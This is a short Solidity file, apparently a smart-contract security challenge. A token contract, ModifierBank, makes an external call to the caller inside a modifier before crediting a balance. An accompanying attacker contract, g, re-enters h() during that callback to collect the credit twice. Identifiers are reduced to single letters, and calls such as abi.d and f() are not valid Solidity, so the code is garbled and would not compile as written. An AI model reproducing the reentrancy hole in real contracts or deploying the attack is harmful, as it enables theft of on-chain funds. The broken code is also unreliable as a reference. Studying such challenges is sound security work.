pragma solidity ^0.4.24;

contract ModifierBank {
  mapping (address => uint) public e;
  string constant j = "Nu Token";


  function h() c a  public{
    e[msg.sender] += 20;
  }


  modifier a() {
    require(f(abi.d("Nu Token")) == Bank(msg.sender).a());
    _;
  }

  modifier c {
      require(e[msg.sender] == 0);
      _;
  }
}

contract Bank{
    function a() external pure returns(bytes32){
        return(f(abi.d("Nu Token")));
    }
}

contract g {
    bool b;
    function a() external returns(bytes32){
        if(!b){
            b = true;
            ModifierBank(msg.sender).h();
        }
        return(f(abi.d("Nu Token")));
    }
    function call(address i) public{
        ModifierBank(i).h();
    }
}